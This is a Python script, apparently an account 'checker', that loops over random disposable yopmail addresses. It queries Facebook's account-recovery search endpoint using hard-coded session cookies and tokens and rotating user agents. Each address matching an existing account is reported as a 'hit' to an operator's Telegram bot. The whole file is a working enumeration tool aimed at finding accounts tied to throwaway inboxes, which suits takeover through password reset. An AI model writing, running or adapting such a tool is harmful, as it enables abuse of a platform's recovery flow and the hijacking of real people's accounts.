
import os,sys
import random,requests
from time import sleep
from user_agent import generate_user_agent

a = '\x1b[38;5;167m'
b = '\x1b[38;5;71m'
R = '\x1b[38;5;1m'   # أحمر
M = '\x1b[38;5;244m' # رمادي 
L = '\x1b[38;5;10m' #اخضر 

OK = 0
BAD = 0

tok =input(f"{M}  [{L} Token {M}] :")
os.system("clear")

id =input(f"{M}  [{L} id {M}] :")
os.system("clear")

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        data = {"chat_id": id, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass

ibra = "qwertyuiopasdfghjklmnbvcxzm"


while True:
	sleep(1)
	len = random.randint(3,5)
	email ="".join(random.choice(ibra) for _ in range(len)) + "@yopmail.com"
	
	
	cookies = {
    'datr': 'UQ-Baol52a5iz2RvO3vKbOMn',
    'sb': 'UQ-BatRDIIUWbsYhLEvoC2KA',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.260737895965576',
    'fr': '0A2NRtmGZw7LS3UJp.AWfoNDiQJ6hatcR7hQh6TZZNrlC7Z8frDoXQZobJcF_fctsGB7U.BqgQ9R..AAA.0.0.Bqpya1.AWfZRNwW2TstfpPNZI04BBjiSSc',
    'wd': '891x1737',
}
	
	headers = {
	        'authority': 'www.facebook.com',
	        'accept': '*/*',
	        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	        'content-type': 'application/x-www-form-urlencoded',
	        'origin': 'https://www.facebook.com',
	        'referer': 'https://www.facebook.com/login/identify/?ci=AdBOm6-kniW8l-WsD8Knpou0NBSHK_qAzM0EiQkM-aU3dWVVWCdvMwig9sOtdrUsP8_ikXUSg-MSiWgXu4JwrsSn_wA20Q8Od0p6nuAK2-cxyS5eu6151Ev61u_hETw8PKmDVRBn8JEEMNFVVbITglZqm4Kqqjv6zYqraTNLlEoBuJW4peoQMR4jtMJ1WMBbyMGXCH6tgS1DNuW_ybhLf_fs8u58ylvRGA0AhSqpps59-3ZCAfYvoRdIqM2pqg4Zus_QsLPrhgn7PV5el9lAKjbHS7fK',
	        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	        'sec-ch-ua-mobile': '?0',
	        'sec-ch-ua-platform': '"Linux"',
	        'user-agent': generate_user_agent(),
	        'x-fb-friendly-name': 'CAAFBAccountSearchViewQuery',
	        'x-fb-lsd': 'AdTKOZYL-cK4FpuYCgA3W7JU_b0',
	    }
	
	data = {
	        'av': '0',
	        '__aaid': '0',
	        '__user': '0',
	        '__a': '1',
	        '__req': '1g',
	        '__hs': '20679.HYP:comet_loggedout_pkg.2.1...0',
	        'dpr': '3',
	        '__ccg': 'GOOD',
	        '__rev': '1045239364',
	        '__s': 'qdev89:i2vdek:tdkgm3',
	        '__hsi': '7674009164981088608',
	        '__dyn': '7xeUjG4E4e5U5ObwyyVp4UnxG2q1DxiFGxK7oG1-zEdF8iBxa361MwFwJzUS8xe1Bw8i7oqx611wno2wgaU7i2qq1eCyUhxR162-8G6kE8Ro4uUfo2lxF122yfBwWxecAwXwEwgonzoO0AE2qwgEhwGxu786a6oowv89k2CcAwOwAwgoszUeUmwvC6UgzEtAx50KK2efK1YwCxe68hzE2ZwzyrwmEiwm8kzu5o4qu1dwkVokylK2W1RwrUO4ohz8ek9zo8U5e3C1jhU2RwhoapocobGAyo884K6o9EbrxS9wr8aEbAeg-3aEgADwBz8a-26U5umEb8uzpo4d08q1rxC11xS3S1EyUd8-2m2BxacxG1dwiE6e9Dxy1iGEdUb8-5XK5oLwSzo',
	        '__csr': 'htOhkzjshhfBHpv6jWkkNBbvJFlnZF8JzJry25SWhrGHKlJDmBeCykhtkQ-hy4rHileW-FcJhykyqGICGWArAmoAyeFmAcEwjF4QJ6L_mBi8AGFebAHAx2bACxWiayVAqFQKUDg9LBAcdj-by9Hz9bAy-q8RAVe6E_jGELV8O2C4rUlz8qKfximEaGAy8uDg441dMaG0FhA5Abg3tMB0okhNk1jeo3_0-Cx674mVmniKqGX4TQVz6GmmzO24xGJv8myX2-osI_WOZEOCMCzr0jI2t1ls4I2H5veiW3rbR8C61ty9FpXAdiQxdhih2dOYWp0x7kOv4G8B3BpkEA0y5g174276gtgadoBBsUBI7mw15Qt0Dgqc3bd0IM9I0NYbM25MqHOg9zDEh3amlRez8xKw4PYLFSGr9SxD4rs8aFz56qlIrAkV27JLZ7Tozy4FhcRrn4h16FVoDRWBtXhF5BW98yRWHJS0hi5Uao1eEboYw3zAx8zYMlK2O2HAgkF3o8prV2qgA_iQxkkew4twgE2Twd20M82Tg2awKg8Eoefw2cUO1diwYxK5RBRw961qw2fU4pWxqiHwXDiFmcloiU-eQ2e2am13xGisFuh0s934G2qmnizo8oBQdmqHizElwYg2bxpo98Tt4zrLCyHeEB6h6Ch2RaE-o9Qahie5HcBGUiyoiwCz8mw9y0CE5226iudwk9AnmV4GVolixm10wq842J5wQUSE1xA4h1j6AWKQidlxbGdDHeddqrU7K0Eoa83Pw5Oy9yza4xvgng1go7y3u1Vo-1vwQwq41pgeQ0Do1s40EoN160PC7oQi8y-q94XGDGJbV8wd1FKewIGF9eXBTuE85we269U2w82icwqEiDhQ1Bxe0ki2vwMzo1782ZUd8oK8wda0Zpo2SxC08JweC2-6WAG7o128tw9-0Xo1vo0aS82XU0kto1vo9ovwhy0Ig3Hxe6DzQ7o-7EpS253Q1LwfS1sZwEWzojUkK4oG268zUyvU2qWxq9w4pDwc3jm1syrVouwiKE9x09XAADxHA9YFA7Uignxm2CU4y1ewspqw2sE7e6U2fwsWxy6A1cwa2m9y8zHDa16RnAwBwHUhwZx-u1UgGcgWag2Bo2-w5myEOfw2s8R4wl89U7q2S1Awj810m0S60ii0vGdGRwa8JgycCO1Ere0Wo9AQiagSsw2AxDcU6608Ywd-0pS1zUeo1eUcE6q290Iiht4XxC6IN80EAdyhY6ohga4umu0NU1eE3cwUyAdyEc826wlE20yIM11E2Fmq0JU3a822axO0hS09hw5KwcucwLgG0HQ32EGiq0Y8ou2K7o7K1IyEkyEswFAAw2A183NyE3ww268boG0V80Dyi0um3G6odQ9yE31G2KgywnE2ZgB0a61Ky6vzYw8-yu3i11g3wwwwf61Qg7CoIi18yNVql21GwGDgdgQd602BU2YwLD9508u0qh0VwbC0IE235w23KdxH4DwVxim5E1uoBoO1igrLhQ0k0bl2WJDCormgYkEo2c4o2fDwfG0FUr8055E6Z02wC0zomzei1cw8e0zpOm1PF08ygU74cMKEcB0PG6825Bxy4B0d82m0q20Eo2jxK06QpO1W0yU4-2i2Z1WjwzNkkEngqN86a6Xx64Ey8xB7xK2V1q09kwVyy1F0',
	        '__hsdp': 'gd3i19aQ5Iykc9K7j328Hci541rBiikM4Bwq8gwRAhEO1SzA2CM8h0wiw9oK4lym2q6iwiohwGo4y6ryu3C3l0fS0UU35xi4i24251kEj80hK0Yo1Vo4q1Tweq2N0nU1a9o2-zomU3-w9mqJ0cDwIAg98lzVUcogBw6Dwc-2WU4e0xA0-Q0ni0Zo0C21uwNw6ywmo2ng7KVQewgGzQ0aDK0JawbS0gK1qUbEvw9O32m09xwHw',
	        '__hblp': '3E2fwRCwd608GwtEboiU4K4o2vwVwyxa0WokwRwaS0wo4e58h81q80zUmwjo9EG0Ooswn8py84a59824w8y1oDzE4C1VyVoaqwBDwIggxS4E3BDwxBgkzUgxKcBwAy8hxu3udxrAwaq0Hoa8hCAqyEOp1e1gCyoy2rwNg9ax53VU8okw5TwKUZ5xi0H9UtwywRxK1szkm0Zk0wUbU2nx-8z42W68G221PyKUeJ4DxG10xi222im1eAxmbwjoy6U4ybyo-48mK541Lw8S8zUrxG1txO68kwKx2fyUvzEkwGDhqg7KVSdwgopzoyh0FzE2wx-U6-7UK2qbwbyQ8geo6afwbSaAw9O15yogJe16G1ky8dEiwQxq4UhgCmi7EC4k2ui23wgobE884G1PwWG1tw',
	        '__sjsp': 'gd3i2BhAHgmO9gMCUtcc8yIN8kg5Kqp0k61Ex23mh1e1SzA2CM8h0wiw9oK4lyu2q1DwYo4y6ryu3C04wE07jO',
	        '__comet_req': '15',
	        'lsd': 'AdTKOZYL-cK4FpuYCgA3W7JU_b0',
	        'jazoest': '22145',
	        '__spin_r': '1045239364',
	        '__spin_b': 'trunk',
	        '__spin_t': '1786744493',
	        '__crn': 'comet.fbweb.CometCAAAccountSearchRoute',
	        'qpl_active_flow_ids': '516759801',
	        'fb_api_caller_class': 'RelayModern',
	        'fb_api_req_friendly_name': 'CAAFBAccountSearchViewQuery',
	        'server_timestamps': 'true',
	        'variables': f'{{"params":{{"cipher_text":"AdBOm6-kniW8l-WsD8Knpou0NBSHK_qAzM0EiQkM-aU3dWVVWCdvMwig9sOtdrUsP8_ikXUSg-MSiWgXu4JwrsSn_wA20Q8Od0p6nuAK2-cxyS5eu6151Ev61u_hETw8PKmDVRBn8JEEMNFVVbITglZqm4Kqqjv6zYqraTNLlEoBuJW4peoQMR4jtMJ1WMBbyMGXCH6tgS1DNuW_ybhLf_fs8u58ylvRGA0AhSqpps59-3ZCAfYvoRdIqM2pqg4Zus_QsLPrhgn7PV5el9lAKjbHS7fK","context":"recover","event_request_id":"f464cd04-6797-4ab2-bb26-33341e062e96","friend_name":"","search_query":"{email}","waterfall_id":"b0150aa3-40fc-42e6-989c-74479d805818"}}}}',
	        'doc_id': '28496659306608697',
	        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
	    }
	
	response = requests.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data,timeout=5).text
	
	if '"num_results_shown":1' in response:
		msg = f"NEW HITS ✅\nGood FACBOOK : {email}\nDeveloper : @I_Z_E_E [🇩🇿] "
		send_telegram(msg)
		OK += 1
	else:
		BAD += 1
	print(f"\r{L} Good : [{OK}] {a}<<< {R} BAD : [{BAD}] {a}<<< {b} chiked : {email}",end="")
		
